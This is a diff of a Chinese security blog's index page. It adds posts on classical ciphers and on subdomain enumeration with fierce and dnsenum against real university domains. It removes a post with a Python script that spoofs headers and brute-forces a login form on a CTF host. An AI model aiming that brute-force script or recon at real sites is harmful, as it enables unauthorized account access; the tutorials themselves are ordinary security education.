@@ -258,6 +258,406 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/22/密码学-一-——古典密码-上/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/22/密码学-一-——古典密码-上/" itemprop="url">
+                  密码学(一)——古典密码(上)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-22T22:10:23+08:00">
+                2017-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/密码学/" itemprop="url" rel="index">
+                    <span itemprop="name">密码学</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/12/22/密码学-一-——古典密码-上/" class="leancloud_visitors" data-flag-title="密码学(一)——古典密码(上)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-信息加密原理"><a href="#0x00-信息加密原理" class="headerlink" title="0x00 信息加密原理"></a>0x00 信息加密原理</h2><p>信息加密是保证数据安全的一种方式。<br>信息加密的原理是：把明文用加密方法和密钥生成保密的密文，只有使用正确的解密方法和密钥后才能还原出明文。<br>一个完善的密码体制至少应该满足两个条件：  </p>
+<ul>
+<li>1.已知明文和加密密钥时，容易算出密文和解密过程。</li>
+<li>2.未知解密密钥时，难以由密文推出明文。  </li>
+</ul>
+<p>这里介绍几种古典密码的加密方式:  </p>
+<h2 id="0x01-Greece密码"><a href="#0x01-Greece密码" class="headerlink" title="0x01 Greece密码"></a>0x01 Greece密码</h2><p>希腊密码出现于公元前2世纪，是一种二维字母表编码方法(字母i和j算一个字母)。<br>如图将26个字母分为5×5的矩阵，用行列号作为字母的编码。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/01.png" alt=""><br>如上图，GREECE可以编码为22 42 15 15 13 15<br>因为几乎是一一对应的关系，通过统计的方法可以很轻松的得出规律。  </p>
+<h2 id="0x02-Caesar密码"><a href="#0x02-Caesar密码" class="headerlink" title="0x02 Caesar密码"></a>0x02 Caesar密码</h2><p>凯撒密码是一种古老的单表置换密码。方法是把字母表种每个字母用后面第n个字母进行替换。<br>如n=5：</p>
+<ul>
+<li>字母表为：abcdefghijklmnopqrstuvwxyz</li>
+<li>置换表为：fghijklmnopqrstuvwxyzabcde</li>
+</ul>
+<p>如caesar可以编码为hfjxfw<br>但是我们显然可以看到凯撒密码暴力破解最多只需要25次穷举就可以看到所有结果，是非常不安全的。  </p>
+<h2 id="0x03-Prefix密码"><a href="#0x03-Prefix密码" class="headerlink" title="0x03 Prefix密码"></a>0x03 Prefix密码</h2><p>标准字头密码又称为密钥短语密码，属于单表置换密码，与凯撒密码类似，但利用一个标准密钥字来做表头，构造变换表。密钥字通常是单词或者词组，便于记忆。<br>如密钥字 K = big，则变换规则如下：</p>
+<ul>
+<li>字母表为：abcdefghijklmnopqrstuvwxyz</li>
+<li>置换表为：bigacdefhjklmnopqrstuvwxyz  </li>
+</ul>
+<p>我们可以看到，big三个字母被放在了表头，然后剩下的字母依次排布。<br>如link的编码是lhnk，可以看到，这种方式如果选择的关键字太少且位于太前，后面的字母本身就对应明文，所以安全性也是很差的。并且所有的字母一一对应的加密方式，都可以用统计的方法破解。</p>
+<h2 id="0x04-Playfair密码"><a href="#0x04-Playfair密码" class="headerlink" title="0x04 Playfair密码"></a>0x04 Playfair密码</h2><p>公平竞赛密码属于多表加密体制，将明文中的双字母组合作为一个单元对待，并将这些单元转换为密文双字母组合。<br>Playfair算法使用一个5×5字母矩阵，该矩阵使用一个关键词构造。<br>例如关键词是big，那么排布规则和Prefix密码一致，只是要按照从左到右，从上到下的顺序把变换表写出来：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/02.png" alt=""><br>生成矩阵之后，根据以下规则依次对明文的两个字母加密。  </p>
+<ul>
+<li>1.属于相同对中的重复明文字母将使用一个填充字母进行分隔。</li>
+<li>2.属于矩阵同行的明文字母将由其右边的字母代替，而行的最后一个字母由行的第一个字母代替。</li>
+<li>3.属于矩阵同列的明文字母将由它下面的字母代替，而列的最后一个字母由列的第一个字母代替。</li>
+<li>4.明文的其他字母将由与其同行，其与下一个字母同列的字母代替。（也可以理解成以两个明文字母为顶角画矩形，矩形的另一对顶角即为密文字母对）  </li>
+</ul>
+<p>Playfair密码比起单字母替换的优势在于，26个字母衍生出26×26=676种双字母组合，频率分布也不规则，使分析起来要难很多。所以一战中被英国陆军作为顶级加密系统，二战中也被同盟国大量使用。</p>
+<h2 id="0x05-Vigenere密码"><a href="#0x05-Vigenere密码" class="headerlink" title="0x05 Vigenere密码"></a>0x05 Vigenere密码</h2><p>维吉尼亚密码是一种简单的单字符多表替换密码。其加密方法是：<br>为了加密一个消息，需要一个与该消息长度一致的密钥。通常该密钥为一重复的关键词。<br>如我们事先构造一个维吉尼亚矩阵，由步长为0到25的26行凯撒密码构成。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/gudianmima/03.png" alt=""><br>如图我们给定密钥字母d和明文字母w，密文字母就位于（d,w）位置。<br>如我们给出密钥关键字是fun，明文是exciting，则：</p>
+<ul>
+<li>密钥为：funfunfu</li>
+<li>明文为：exciting</li>
+<li>密文为：jrpnnvsa</li>
+</ul>
+<p>解密方法则是以密钥字母标识行，密文字母标识列，明文字母位于该列首部。<br>Vigenere密码的强度在于每个明文字母由多个密文字母对应，字母的频率信息变得模糊了，但是并不是所有明文得出的频率信息都丢失了，比起Playfair更优，但是还是会保留大量的频率信息。  </p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/17/域名收集/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/17/域名收集/" itemprop="url">
+                  域名收集
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-17T19:38:24+08:00">
+                2017-12-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/12/17/域名收集/" class="leancloud_visitors" data-flag-title="域名收集">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>信息收集上的花费要占到一次渗透测试很大的比例，域名收集则是信息收集重要的一环。 </p>
+<h2 id="0x00-常用域名收集方法一览"><a href="#0x00-常用域名收集方法一览" class="headerlink" title="0x00 常用域名收集方法一览"></a>0x00 常用域名收集方法一览</h2><ul>
+<li>搜索引擎</li>
+<li>github</li>
+<li>fierce</li>
+<li>dnsenum</li>
+</ul>
+<h2 id="0x01-搜索引擎"><a href="#0x01-搜索引擎" class="headerlink" title="0x01 搜索引擎"></a>0x01 搜索引擎</h2><p>搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。<br>我们在进行域名收集时，借助搜索引擎是方便的一种方式，收集方式与一般访问无异，收集之后不会被目的服务器的安全策略记录为异常，但是收集完善性有限。如果目标网站有robot.txt中对搜索引擎的限制，则无法收集，不过我们可以通过访问其robot.txt，然后手动进行扫描或者写脚本进行扫描。<br>如我们收集西电相关的域名site:xidian.edu.cn<br>如图我们使用google搜索引擎和yandex搜索引擎进行收集：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/01.png" alt="">  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/02.jpg" alt=""></p>
+<h2 id="0x02-github"><a href="#0x02-github" class="headerlink" title="0x02 github"></a>0x02 github</h2><p>gitHub是一个面向开源及私有软件项目的托管平台，功能十分强大，绝大多数开发人员都会使用。<br>在github的搜索框中键入目标官方域名，就可以得到很多相关项目，代码，网站等搜索结果。<br>如输入 xidian.edu.cn,在code选项卡可以看到很多结果：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/03.png" alt=""></p>
+<h2 id="0x03-fierce"><a href="#0x03-fierce" class="headerlink" title="0x03 fierce"></a>0x03 fierce</h2><p>fierce是一个域名扫描综合性工具。它可以快速获取指定域名的DNS服务器，并检查是否存在区域传输（Zone Transfer）漏洞。如果不存在该漏洞，会自动执行暴力破解，以获取子域名信息。对获取的IP地址，它还会遍历周边IP地址，以获取更多的信息。最后，还会将IP地址进行分段统计，以便于后期其他工具扫描，如NMAP。<br>这里用西工大的官网进行测试<br>使用方法：</p>
+<ul>
+<li>基本扫描<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/04.png" alt=""></li>
+<li>指明需要搜索的子域名<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/05.png" alt=""></li>
+<li>在域名周围的连续快中遍历<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/06.png" alt=""></li>
+<li>还有很多方法，我们可以在帮助文件中自行尝试<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/07.png" alt=""></li>
+</ul>
+<h2 id="0x04-dnsenum"><a href="#0x04-dnsenum" class="headerlink" title="0x04 dnsenum"></a>0x04 dnsenum</h2><p>DNSenum是一款非常强大的 域名信息收集工具，目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。<br>同样用西工大的域名作为测试对象<br>使用方法：  </p>
+<ul>
+<li>基本使用<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/08.png" alt=""></li>
+<li>根据字典文件遍历子域名<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/09.png" alt=""></li>
+<li>保存扫描结果<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/yuming/10.png" alt="">  </li>
+</ul>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>域名收集的方式还有很多，比如利用DNS反相解析来收集域名，利用DNS Transfer来收集域名，利用zap来被动感知域名等等。<br>收集途径很多但没有什么优劣之分，在我们进行域名收集时，要根据自己的实际需求来做出恰当的选择。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/12/基于python的网站后台扫描器/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1823,401 +2223,6 @@ main()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/26/python爬虫暴力破解网站登陆密码（一）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" itemprop="url">
-                  python爬虫暴力破解网站登陆密码（一）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-26T22:00:01+08:00">
-                2017-06-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/06/26/python爬虫暴力破解网站登陆密码（一）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（一）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="python爬虫暴力破解网站登陆密码（一）"><a href="#python爬虫暴力破解网站登陆密码（一）" class="headerlink" title="python爬虫暴力破解网站登陆密码（一）"></a>python爬虫暴力破解网站登陆密码（一）</h1><p>本来准备一次写完这篇博客，但是写出主干后发现有很多重要的东西没有提到，所以就分成两篇写，这篇写基础操作，下一篇加上验证码处理和多线程处理模块。  </p>
-<h2 id="0x00-robot-txt"><a href="#0x00-robot-txt" class="headerlink" title="0x00 robot.txt"></a>0x00 robot.txt</h2><p>在写爬虫爬取某个网站之前，我们应该去了解这个网站的robot.txt。那什么是robot.txt呢？简单的说，就是网站的所有者为了让爬虫了解爬取该网站的时候存在哪些限制。虽然这些限制只是建议，但是如果你的爬虫不遵守这些限制，很容易会被网站所封禁。<br>下图为IBM官方网站的robot.txt，我们写爬虫的时候，应该尽量遵守规定。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/a.png" alt="">  </p>
-<p>  下面给出几种写法示例：  </p>
-<ol>
-<li><p>允许所有的robot访问  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Allow: / </span><br><span class="line">或者</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>禁止所有搜索引擎访问网站的任何部分</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>仅禁止Baiduspider访问您的网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>仅允许Baiduspider访问您的网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>禁止spider访问特定目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /tmp/</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="0x01-伪造header"><a href="#0x01-伪造header" class="headerlink" title="0x01 伪造header"></a>0x01 伪造header</h2><p>网站防采集的前提就是要正确地区分人类访问用户和网络机器人，方法之一就是查看你的http请求头，我们为了让自己的爬虫看起来更像是人类用户，就需要对header进行伪造。<br>伪造header成什么样最好呢？当然是伪造成自己手动访问时候的样子最好。这里我们就能用到Firefox中的一个扩展工具——HttpFox（也可以用Chrome开发者模式直接查看），利用这个工具，我们能抓取我们用Firefox访问网站过程的数据包，然后查看这个数据包，就可以看到我们手动访问时的header，然后使用python的requests库进行伪造。<br>  <img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/b.png" alt="">  </p>
-<p>  代码中hea的部分就可以照着上图写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x02-填写data并登陆"><a href="#0x02-填写data并登陆" class="headerlink" title="0x02 填写data并登陆"></a>0x02 填写data并登陆</h2><p>既然要破解登陆密码，那前提肯定要做到登陆，我们手动登陆的时候当然是输入账号，输入密码，然后点击提交。可是爬虫工作时，看到的和我们不一样，这个时候账号密码应该怎么传入、登陆操作该怎么进行呢？这个时候再一次用到了Httpfox（同样可以用Chrome开发者模式直接查看），上次我们手动输入时，传入的数据在Httpfox中也被抓取了，照着他的样子填好data，然后我们使用requests中的post命令传入data获取一个cookie，然后再通过cookies访问下一个网站，就实现了爬虫的登陆。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/c.png" alt="">  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/d.png" alt="">  </p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/e.png" alt=""><br>如这个网站，两种方法都可以看到要传递的数据，那么填写的时候就要写成这种格式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'j_username'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'j_password'</span>: <span class="string">'xxxxxx'</span>,</span><br><span class="line">	<span class="string">'checkCode'</span>: <span class="string">'xxx'</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>这里用一个ctf环境先做一个小脚本进行测试，这道题密码是五位纯数字，生成字典的方法之前破解压缩包的时候已经讲过不在赘述，代码如下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line">hea = &#123; <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span> : <span class="string">'zh-hk,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'www.baidu.com'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">       &#125;</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/baopo/?yes'</span></span><br><span class="line">data = &#123;<span class="string">'pwd'</span>:<span class="number">123</span>&#125;</span><br><span class="line"></span><br><span class="line">content = requests.post(url,data=data,headers=hea)</span><br><span class="line">content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(<span class="string">r'C:\Users\Leticia\Desktop\mutou.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> passFile.readlines():</span><br><span class="line">    password = line.strip(<span class="string">'\n'</span>)</span><br><span class="line">    data = &#123;<span class="string">'pwd'</span>:password&#125;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'trying'</span>,password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=<span class="string">'utf-8'</span></span><br><span class="line">    html=content.text</span><br><span class="line">    <span class="keyword">if</span> html != recv:</span><br><span class="line">        <span class="keyword">print</span> html</span><br></pre></td></tr></table></figure>
-<p>结果如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/f.png" alt=""><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/python/g.png" alt="">  </p>
-<p>这个脚本的雏形就有了，可以爆破出结果，但是还存在速度很慢，遇到验证码无法进行等问题，下一节再加上验证码处理和多线程处理的模块,解决了这几个问题，就可以用来处理常见的网站了。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/29/ctf中常见的隐写术/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/05/29/ctf中常见的隐写术/" itemprop="url">
-                  ctf中常见的隐写术
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-29T09:58:19+08:00">
-                2017-05-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/05/29/ctf中常见的隐写术/" class="leancloud_visitors" data-flag-title="ctf中常见的隐写术">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="ctf中常见的隐写术"><a href="#ctf中常见的隐写术" class="headerlink" title="ctf中常见的隐写术"></a>ctf中常见的隐写术</h1><h2 id="0x01-什么是隐写术"><a href="#0x01-什么是隐写术" class="headerlink" title="0x01 什么是隐写术"></a>0x01 什么是隐写术</h2><p>隐写术是关于信息隐藏，即不让计划的接收者之外的任何人知道信息的传递事件（而不只是信息的内容）的一门技巧与科学。具体涉及到图片隐写，音频隐写，视频隐写。其中图片的隐写是最为常见的，也是ctf中常见的一种题型。</p>
